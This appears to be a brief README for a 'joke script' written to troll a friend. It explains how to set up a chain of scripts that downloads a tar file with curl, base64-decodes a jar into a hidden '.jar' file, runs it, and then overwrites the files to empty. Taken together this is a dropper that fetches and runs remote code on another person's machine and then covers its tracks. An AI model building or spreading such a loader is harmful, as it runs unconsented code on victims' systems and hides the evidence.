Joke script that I made to troll a friend.



aTar, change the value of a1 withing script m to the command ``curl -s (fileurlHere) --output tmp.tar``,
The tar tmp should contain 1 file called owo. To change the jar simply run ``cat yourJar.jar | base64 > owo``
Essentially owo is decoded by script R and written to a file called ``.jar`` then that jar is ran by the script. 
Afterwards all files are overwritten to be empty by script c.
